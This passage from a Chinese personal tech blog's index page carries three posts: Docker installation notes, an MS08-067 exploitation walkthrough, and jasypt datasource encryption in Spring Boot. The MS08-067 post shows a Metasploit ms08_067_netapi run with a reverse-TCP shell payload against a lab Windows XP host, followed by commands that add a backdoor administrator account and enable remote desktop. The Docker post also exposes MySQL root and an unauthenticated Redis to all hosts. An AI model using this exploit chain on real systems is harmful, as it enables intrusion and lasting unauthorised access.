+            <h1 id="Docker笔记"><a href="#Docker笔记" class="headerlink" title="Docker笔记"></a>Docker笔记</h1><h2 id="1-系统准备"><a href="#1-系统准备" class="headerlink" title="1.系统准备"></a>1.系统准备</h2><h3 id="1-1配置网络"><a href="#1-1配置网络" class="headerlink" title="1.1配置网络"></a>1.1配置网络</h3><h3 id="1-2yum包更新到最新"><a href="#1-2yum包更新到最新" class="headerlink" title="1.2yum包更新到最新"></a>1.2yum包更新到最新</h3><blockquote>
+<p>yum update</p>
+</blockquote>
+<h3 id="1-3安装依赖的软件包"><a href="#1-3安装依赖的软件包" class="headerlink" title="1.3安装依赖的软件包"></a>1.3安装依赖的软件包</h3><blockquote>
+<p>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</p>
+</blockquote>
+<h3 id="1-4设置docker-yum源"><a href="#1-4设置docker-yum源" class="headerlink" title="1.4设置docker-yum源"></a>1.4设置docker-yum源</h3><blockquote>
+<p>特别注意复制粘贴后.repo可能会丢</p>
+</blockquote>
+<pre><code class="shell">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/dockerce.
+repo
+</code></pre>
+<blockquote>
+<p>会出现Could not fetch&#x2F;save url <a target="_blank" rel="noopener" href="https://download.docker.com/linux/centos/dockerce.repo">https://download.docker.com/linux/centos/dockerce.repo</a>                                                                                                           to file &#x2F;etc&#x2F;yum.repos.d&#x2F;dockerce.repo: [Errno 14] HTTPS Error 404 - Not Found</p>
+</blockquote>
+<h4 id="推荐方式"><a href="#推荐方式" class="headerlink" title="推荐方式:"></a>推荐方式:</h4><pre><code class="shell">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+
+sudo yum makecache fast
+</code></pre>
+<h2 id="2-安装Docker"><a href="#2-安装Docker" class="headerlink" title="2.安装Docker"></a>2.安装Docker</h2><h3 id="2-1安装Docker"><a href="#2-1安装Docker" class="headerlink" title="2.1安装Docker"></a>2.1安装Docker</h3><pre><code class="shell">yum install -y docker-ce
+</code></pre>
+<h3 id="2-2查看docker版本-验证是否安装"><a href="#2-2查看docker版本-验证是否安装" class="headerlink" title="2.2查看docker版本(验证是否安装)"></a>2.2查看docker版本(验证是否安装)</h3><pre><code class="shell">docker version
+</code></pre>
+<h3 id="2-3查看docker是否启动"><a href="#2-3查看docker是否启动" class="headerlink" title="2.3查看docker是否启动"></a>2.3查看docker是否启动</h3><pre><code class="shell">ps -ef | grep docker
+</code></pre>
+<h3 id="2-4启动docker并加入开机启动"><a href="#2-4启动docker并加入开机启动" class="headerlink" title="2.4启动docker并加入开机启动"></a>2.4启动docker并加入开机启动</h3><pre><code class="shell">systemctl start docker
+systemctl enable docker
+</code></pre>
+<h2 id="3-卸载Docker"><a href="#3-卸载Docker" class="headerlink" title="3.卸载Docker"></a>3.卸载Docker</h2><h3 id="3-1查看Docker状态"><a href="#3-1查看Docker状态" class="headerlink" title="3.1查看Docker状态"></a>3.1查看Docker状态</h3><pre><code class="shell">systemctl status docker
+</code></pre>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414114858954.png" alt="image-20230414114858954" style="zoom:50%;" />
+
+<h3 id="3-2运行状态需要停止docker"><a href="#3-2运行状态需要停止docker" class="headerlink" title="3.2运行状态需要停止docker"></a>3.2运行状态需要停止docker</h3><pre><code class="shell">systemctl stop docker
+</code></pre>
+<h3 id="3-3查看yum安装的docker包"><a href="#3-3查看yum安装的docker包" class="headerlink" title="3.3查看yum安装的docker包"></a>3.3查看yum安装的docker包</h3><pre><code class="shell">yum list installed |grep docker
+</code></pre>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414115322102.png" alt="image-20230414115322102" style="zoom:50%;" />
+
+<h3 id="3-4查看docker相关的rpm源文件"><a href="#3-4查看docker相关的rpm源文件" class="headerlink" title="3.4查看docker相关的rpm源文件"></a>3.4查看docker相关的rpm源文件</h3><pre><code class="shell">rpm -qa | grep docker
+</code></pre>
+<h3 id="3-5删除yum安装的docker文件包"><a href="#3-5删除yum安装的docker文件包" class="headerlink" title="3.5删除yum安装的docker文件包"></a>3.5删除yum安装的docker文件包</h3><pre><code class="shell">yum -y remove 文件包
+</code></pre>
+<blockquote>
+<p>文件包: yum list installed | grep docker输出的所有包</p>
+<p>删完之后可以再看一下docker的rpm源文件</p>
+</blockquote>
+<h3 id="3-6删除docker镜像文件"><a href="#3-6删除docker镜像文件" class="headerlink" title="3.6删除docker镜像文件"></a>3.6删除docker镜像文件</h3><blockquote>
+<p>默认在&#x2F;var&#x2F;lib&#x2F;docker</p>
+</blockquote>
+<pre><code class="shell">rm -rf /var/lib/docker
+</code></pre>
+<h2 id="4-删除服务并重新运行"><a href="#4-删除服务并重新运行" class="headerlink" title="4.删除服务并重新运行"></a>4.删除服务并重新运行</h2><h3 id="3-1-删除之前部署的服务"><a href="#3-1-删除之前部署的服务" class="headerlink" title="3.1 删除之前部署的服务"></a>3.1 删除之前部署的服务</h3><pre><code class="shell">docker rm st-test-ui
+</code></pre>
+<h3 id="3-2-重新运行"><a href="#3-2-重新运行" class="headerlink" title="3.2 重新运行"></a>3.2 重新运行</h3><pre><code class="shell">docker run -itd --name st-test-ui --publish 9595:80 -v /home/nodejs/st-testnginx/
+default.conf:/etc/nginx/conf.d/default.conf -v /home/nodejs/st-testnginx/:/
+usr/share/nginx/html/ nginx:luxi
+</code></pre>
+<h3 id="3-3-查看default-conf"><a href="#3-3-查看default-conf" class="headerlink" title="3.3 查看default.conf"></a>3.3 查看default.conf</h3><blockquote>
+<p> 在st-test-nginx目录下的home&#x2F;nodejs中就能看到default.conf文件了</p>
+</blockquote>
+<h2 id="5-设置镜像加速器"><a href="#5-设置镜像加速器" class="headerlink" title="5.设置镜像加速器"></a>5.设置镜像加速器</h2><blockquote>
+<p>阿里云控制台—&gt;搜索镜像加速器</p>
+<p>或者点链接:<a target="_blank" rel="noopener" href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">容器镜像服务 (aliyun.com)</a></p>
+</blockquote>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414120336687.png" alt="image-20230414120336687" style="zoom:33%;" />
+
+<blockquote>
+<p>依次执行以上4句命令</p>
+</blockquote>
+<h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><pre><code class="shell">sudo mkdir -p /etc/docker
+
+sudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;
+&#123;
+  &quot;registry-mirrors&quot;: [&quot;https://gseqhafl.mirror.aliyuncs.com&quot;]
+&#125;
+EOF
+
+sudo systemctl daemon-reload
+
+sudo systemctl restart docker
+</code></pre>
+<h2 id="6-Docker常用命令"><a href="#6-Docker常用命令" class="headerlink" title="6.Docker常用命令"></a>6.Docker常用命令</h2><h3 id="1-查看安装的docker镜像"><a href="#1-查看安装的docker镜像" class="headerlink" title="1.查看安装的docker镜像"></a>1.查看安装的docker镜像</h3><pre><code class="shell">docker images
+</code></pre>
+<h3 id="2-启动-停止-重启-开机自启"><a href="#2-启动-停止-重启-开机自启" class="headerlink" title="2.启动,停止,重启,开机自启"></a>2.启动,停止,重启,开机自启</h3><pre><code class="shell">systemctl start docker
+systemctl stop docker
+systemctl restart docker
+systemctl enable docker
+</code></pre>
+<h3 id="3-删除安装的docker镜像"><a href="#3-删除安装的docker镜像" class="headerlink" title="3.删除安装的docker镜像"></a>3.删除安装的docker镜像</h3><pre><code class="shell">docker rmi 镜像名:版本号
+例如: docker rmi redis:6.0
+</code></pre>
+<h3 id="4-安装镜像"><a href="#4-安装镜像" class="headerlink" title="4.安装镜像"></a>4.安装镜像</h3><pre><code class="shell">docker search 镜像名
+例如:docker search redis
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414130643663.png" alt="image-20230414130643663"></p>
+<blockquote>
+<p>下载镜像</p>
+</blockquote>
+<pre><code class="shell">docker pull 服务名 #默认下载最高版本
+docker pull 服务名:版本号 #指定下载版本
+</code></pre>
+<blockquote>
+<p>如果不知道版本,进入docker官网查询:<a target="_blank" rel="noopener" href="https://hub.docker.com/">Docker Hub Container Image Library | App Containerization</a></p>
+</blockquote>
+<p>网站左上角搜索服务名,选择自己需要下载的包,点进去,查看版本列表</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414200231807.png" alt="image-20230414200231807" style="zoom:33%;" />
+
+<p>支持的所有版本都在此页面.</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20230414200554571.png" alt="image-20230414200554571" style="zoom:50%;" />
+
+<h3 id="5-启动镜像"><a href="#5-启动镜像" class="headerlink" title="5.启动镜像"></a>5.启动镜像</h3><pre><code class="shell">docker run -id --name=实例名称 -p 端口:端口 镜像名:版本号 /bin/bash
+例如:docker run -id --name=xccit_redis -p 6379:6379 redis:6.0 /bin/bash
+</code></pre>
+<blockquote>
+<p>参数:</p>
+<p>​	-i :交互式操作,保持容器运行。-it创建后自动进入容器，退出终端后自动关闭容器。</p>
+<p>​	-t:终端。</p>
+<p>​	-d:后台运行，退出终端后不会关闭容器。</p>
+<p>​	–name:给实例取个名字。</p>
+<p>​	xccit_redis:实例名。</p>
+<p>​	-p:端口。</p>
+<p>​	-it一般用来运行交互式容器，即一次交互后退出即可。-id一般用来运行后台守护容器，例如MySQL,Tomcat。</p>
+<p>​	&#x2F;bin&#x2F;bash:交互式Shell。</p>
+</blockquote>
+<p>举个例子:</p>
+<pre><code class="shell">docker run -it --name=xccit_redis -p 6379:6379 redis:6.0 /bin/bash
+</code></pre>
+<p>运行以上命令，redis不会在后台停留，并且运行完之后会直接进入到redis操作shell中。</p>
+<pre><code class="shell">docker run -id --name=xccit_redis -p 6379:6379 redis:6.0 /bin/bash
+</code></pre>
+<p>运行以上命令，redis会在后台停留，并且运行完之后不会直接进入到redis操作shell中,如果要进入到redis操作shell中，需要使用到docker exec…</p>
+<pre><code class="shell">docker run -itd --name=xccit_redis -p 6379:6379 redis:6.0 /bin/bash
+</code></pre>
+<p>运行以上命令，redis会在后台停留，并且运行完之后会直接进入到redis操作shell中。</p>
+<h3 id="6-查看所有镜像实例的状态"><a href="#6-查看所有镜像实例的状态" class="headerlink" title="6.查看所有镜像实例的状态"></a>6.查看所有镜像实例的状态</h3><pre><code class="shell">docker ps -a #实例的所有信息
+docker ps -aq #实例的ID
+</code></pre>
+<h3 id="7-Linux本地连接实例"><a href="#7-Linux本地连接实例" class="headerlink" title="7.Linux本地连接实例"></a>7.Linux本地连接实例</h3><pre><code class="shell">docker exec -it 实例名 /bin/bash
+例如:docker exec -it xccit_redis /bin/bash
+</code></pre>
+<blockquote>
+<p>连接redis:</p>
+<p>​	redis-cli</p>
+<p>退出redis实例</p>
+<p>exit</p>
+<p>参数解析:</p>
+<p>​	exec:执行</p>
+<p>​	-it:带命令行的方式及可以后台</p>
+<p>​	xccit_redis:实例名称</p>
+<p>​	&#x2F;bin&#x2F;bash:以命令行的方式打开</p>
+</blockquote>
+<blockquote>
+<p>注意:此实例是一个独立的Linux子系统,通过<br>    cd &#x2F;</p>
+<p>​	ls</p>
+<p>两条命令,可以看到存在的目录跟一个全新的Linux基本一致,并且在宿主机中新建目录,在此实例中是看不到该宿主机中存在的目录的,即在此宿主机中运行10个redis实例,相当于在此宿主机中安装了10个Linux子系统</p>
+</blockquote>
+<h3 id="8-停止与启动实例"><a href="#8-停止与启动实例" class="headerlink" title="8.停止与启动实例"></a>8.停止与启动实例</h3><blockquote>
+<p>停止实例</p>
+</blockquote>
+<pre><code class="shell">docker stop 实例名称 #方式一
+docker stop 实例ID #方式二(适合有多个相同实例)
+docker stop `实例ID1,实例ID2...` #同时停止多个实例,ID可以简写
+docker stop `docker ps -aq` #停止所有实例
+</code></pre>
+<blockquote>
+<p>开启实例</p>
+</blockquote>
+<pre><code class="shell">docker start 实例名称 #方式一
+docker start 实例ID #方式二(适合多个相同实例)
+docker start `实例ID1,实例ID2...` #同时开启多个实例,ID可以简写
+docker start `docker ps -aq` #查看所有实例li
+</code></pre>
+<blockquote>
+<p>ID简写:</p>
+<p>​	注意:如果嫌实例ID太长,可以只敲前面两三位,但必须保证前面两三位中没有其他实例ID冲突,不然会启动&#x2F;停	    	止失败</p>
+</blockquote>
+<h3 id="9-删除docker实例"><a href="#9-删除docker实例" class="headerlink" title="9.删除docker实例"></a>9.删除docker实例</h3><pre><code class="shell">docker rm 实例ID #删除一个
+docker rm `docker ps -a` #删除所有
+</code></pre>
+<blockquote>
+<p>注意:删除时,实例需在停止运行状态</p>
+</blockquote>
+<blockquote>
+<p>如需删除所有运行中的实例:</p>
+</blockquote>
+<pre><code class="shell">docker stop `docker ps -aq` #停止实例
+docker rm `docker ps -aq` #删除实例
+docker ps -aq #查看实例是否还存在
+</code></pre>
+<h2 id="7-安装mysql"><a href="#7-安装mysql" class="headerlink" title="7.安装mysql"></a>7.安装mysql</h2><pre><code class="shell">docker pull mysql
+#3307对外开放 3306本机访问(password自定义密码)
+docker run --name b2c_mysql -p 3306:3306 -v /b2c/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=password -d mysql --character-set-server=UTF8MB4 --collation-server=utf8mb4_unicode_ci
+#本机登录
+ docker exec -it b2c_mysql bash
+ mysql -uroot -p
+#开启远程访问
+grant all privileges on *.*  to &#39;root&#39;@&#39;%&#39;; #用户授权
+flush privileges; #刷新权限
+</code></pre>
+<blockquote>
+<p>注意:需要TCP&#x2F;UDP双向开放3307端口</p>
+</blockquote>
+<h2 id="8-安装elasticSearch"><a href="#8-安装elasticSearch" class="headerlink" title="8.安装elasticSearch"></a>8.安装elasticSearch</h2><pre><code class="shell">docker network create es-net
+
+docker pull elasticsearch:7.12.1
+
+docker pull kibana:7.12.1
+
+docker run -d --name b2c_elasticsearch -e &quot;ES_JAVA_OPTS=-Xms512m -Xmx512m&quot; -e &quot;discovery.type=single-node&quot; -v es-data:/usr/shar/elasticsearch/data -v es-plugins:/usr/share/elasticsearch/plugins --privileged --network es-net -p 9200:9200 -p 9300:9300 elasticsearch:7.12.1
+
+docker run -d --name kibana -e ELASTICSEARCH_HOSTS=http://b2c_elasticsearch:9200 --network=es-net -p 5601:5601 kibana:7.12.1
+
+docker volume inspect es-plugins
+</code></pre>
+<pre><code class="shell">[root@VM-16-10-centos ~]# docker volume inspect es-plugins
+[
+    &#123;
+        &quot;CreatedAt&quot;: &quot;2023-09-09T12:40:34+08:00&quot;,
+        &quot;Driver&quot;: &quot;local&quot;,
+        &quot;Labels&quot;: null,
+        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/es-plugins/_data&quot;,
+        &quot;Name&quot;: &quot;es-plugins&quot;,
+        &quot;Options&quot;: null,
+        &quot;Scope&quot;: &quot;local&quot;
+    &#125;
+]
+</code></pre>
+<blockquote>
+<p>以上结果中,”Mountpoint”: “&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;es-plugins&#x2F;_data”是es配置文件地址</p>
+<p>安装ik分词器会用到</p>
+</blockquote>
+<pre><code class="shell"> mv ik/ /var/lib/docker/volumes/es-plugins/_data/  #将解压后的ik文件夹移动到此路径下
+ #重启es
+ docker restart es
+</code></pre>
+<h2 id="9-安装Redis"><a href="#9-安装Redis" class="headerlink" title="9.安装Redis"></a>9.安装Redis</h2><pre><code class="shell">#1 拉取镜像
+docker pull redis:7.0.10
+
+#2 在宿主机的 /var/lib/docker/volumes/redis-config/_data/目录下创建一个redis的配置文件，
+vim redis.conf
+# 内容如下所示
+#开启持久化
+appendonly yes
+port 6379
+# requirepass 1234
+bind 0.0.0.0
+
+#3 如果/var/lib/docker/volumes没有redis-config，创建数据卷 
+docker volume create redis-config
+
+#4 创建容器
+docker run -d -p 6379:6379 --restart=always \
+-v redis-config:/etc/redis/config \
+-v redis-data:/data \
+--name b2c_redis redis \
+redis-server /etc/redis/config/redis.conf
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/docker/" style="color: #00a596">docker</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/13/Docker%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+        <h2 class="post-title">MS08-067漏洞利用</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/12
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="MS08-067漏洞利用"><a href="#MS08-067漏洞利用" class="headerlink" title="MS08-067漏洞利用"></a>MS08-067漏洞利用</h1><p>目标机器:192.168.1.7 Windows XP</p>
+<p>攻击机:192.168.1.12 Kali</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><pre><code class="nmap">nmap -O -T4 -p445 -sV --script smb-vuln-ms08-067 192.168.1.7
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408140441521.png" alt="image-20210408140441521"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="nmap">service postgresql start
+msfconsole
+search 08-067
+use exploit/windows/smb/ms08_067_netapi
+show options
+set rhosts 192.168.1.7
+set payload windows/shell/reverse_tcp
+set lhost 192.168.1.12
+exploit
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408140542782.png" alt="image-20210408140542782"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408141354688.png" alt="image-20210408141354688"></p>
+<p><strong>exploit</strong>命令执行后就成功利用漏洞进入了windows系统</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408141816252.png" alt="image-20210408141816252"></p>
+<p>进入windows系统后执行以下命令，新建用户方便进入winows系统</p>
+<pre><code class="shell">net user hacker 123456 /add      hacker:用户名 123456:密码
+net localhost administrators hacker /add  hacker:用户名    --将hacker用户添加至管理员组
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  开启3389端口
+</code></pre>
+<p>而后kali新打开一个shell窗口，输入以下命令进行远控登录:</p>
+<pre><code class="shell">rdesktop 192.168.1.7
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408142450690.png" alt="image-20210408142450690"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408142515324.png" alt="image-20210408142515324"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E4%BF%A1%E5%AE%89/" style="color: #ff7d73">信安</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/">
+        <h2 class="post-title">SpringBoot项目开启数据源加密</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/12
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="SpringBoot实现数据源加密"><a href="#SpringBoot实现数据源加密" class="headerlink" title="SpringBoot实现数据源加密"></a>SpringBoot实现数据源加密</h1><h2 id="1-为什么要进行数据源加密"><a href="#1-为什么要进行数据源加密" class="headerlink" title="1.为什么要进行数据源加密?"></a>1.为什么要进行数据源加密?</h2><blockquote>
+<p>项目测试阶段,较为严苛的公司一般都需要进行数据源加密,特别是一些特殊部门的外包项目,测试文档中对数据源加密的测试流程很严格,不然会在项目被反编译时暴露数据源信息。</p>
+</blockquote>
+<h2 id="2-如何进行数据源加密"><a href="#2-如何进行数据源加密" class="headerlink" title="2.如何进行数据源加密?"></a>2.如何进行数据源加密?</h2><h3 id="2-1-使用jasypt"><a href="#2-1-使用jasypt" class="headerlink" title="2.1 使用jasypt"></a>2.1 使用jasypt</h3><blockquote>
+<p>实现数据源加密的方式有很多,以jasypt为例</p>
+</blockquote>
+<h4 id="2-1-1-引入jar"><a href="#2-1-1-引入jar" class="headerlink" title="2.1.1 引入jar"></a>2.1.1 引入jar</h4><blockquote>
+<p>我们创建一个工程,引入jar信息:</p>
+</blockquote>
+<pre><code class="xml">        &lt;dependency&gt;
+            &lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt;
+            &lt;artifactId&gt;jasypt-spring-boot-starter&lt;/artifactId&gt;
+            &lt;version&gt;3.0.5&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<h4 id="2-1-2-配置加密信息"><a href="#2-1-2-配置加密信息" class="headerlink" title="2.1.2 配置加密信息"></a>2.1.2 配置加密信息</h4><blockquote>
+<p>以SpringBoot工程为例,在yml或properties配置文件中配置如下信息:</p>
+</blockquote>
+<pre><code class="yaml"># 数据源加密
+jasypt:
+  encryptor:
+    password: $&#123;PASSWORD&#125;
+    algorithm: PBEWithHMACSHA512AndAES_256
+</code></pre>
+<h4 id="2-1-3-编写测试类"><a href="#2-1-3-编写测试类" class="headerlink" title="2.1.3 编写测试类"></a>2.1.3 编写测试类</h4><pre><code class="java">/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/6/9
+ * &lt;p&gt;&lt;/p&gt;
+ */
+@SpringBootTest
+public class TestDBAuth &#123;
+
+    @Test
+    public void test()&#123;
+        // PBEWithHMACSHA512AndAES_256加密方式,看配置文件
+        AES256TextEncryptor textEncryptor = new AES256TextEncryptor();
+        textEncryptor.setPassword(&quot;ADMIN&quot;); //参数为加盐的值
+        String myEncryptedText = textEncryptor.encrypt(&quot;Xccit.1209&quot;); //参数为真实密码
+        //加密后的结果
+        System.out.println(myEncryptedText);
+        String plainText = textEncryptor.decrypt(myEncryptedText);
+        //解密后的结果
+        System.out.println(plainText);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240712234044350.png" alt="image-20240712234044350"><br>如图,看到输出结果是这样就对了</p>
+<h4 id="2-1-4-重新配置数据源"><a href="#2-1-4-重新配置数据源" class="headerlink" title="2.1.4 重新配置数据源"></a>2.1.4 重新配置数据源</h4><blockquote>
+<p>将加密后的结果按如图配置:<br><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240712234128978.png" alt="image-20240712234128978"><br>SpringBoot在启动的时候会根据ENC()来判断是否有加密，如果有会根据配置的盐和算法进行解码。</p>
+</blockquote>
+<h4 id="2-1-5-启动时加上环境变量"><a href="#2-1-5-启动时加上环境变量" class="headerlink" title="2.1.5 启动时加上环境变量"></a>2.1.5 启动时加上环境变量</h4><blockquote>
+<p>这里在测试阶段可以使用IDEA加环境变量的方式启动<br><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240712234156051.png" alt="image-20240712234156051"><br>PASSWORD: jasypt配置中的key<br>ADMIN:测试类中加盐字段的值,必须保持一致,不然数据源密码会解密失败</p>
+</blockquote>
+<blockquote>
+<p>打成jar包后可以使用命令行参数启动:</p>
+</blockquote>
+<pre><code class="shell">java -jar xxx.jar PASSWORD=ADMIN
+</code></pre>
+<h2 id="3-看一下效果"><a href="#3-看一下效果" class="headerlink" title="3.看一下效果"></a>3.看一下效果</h2><p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240712234218352.png" alt="image-20240712234218352"></p>
+<p>正常启动,无报错,如果对数据库操作报密码错误,请检查盐值。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/SpringBoot/" style="color: #00a596">SpringBoot</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <span class="current">1</span>
+    
+    
+    
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/myavatar.jpg" alt="avatar" />
+        </div>
+        <div class="name">CH_ywx</div>
+        <div class="description">
+            <p>贩卖温柔の優しさを振りまく<br>   QQ: 1571466236<br>WECHAT: lucky_all_time_max</p>
+
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 xccitのblog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;CH_ywx
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+</body>
+</html>
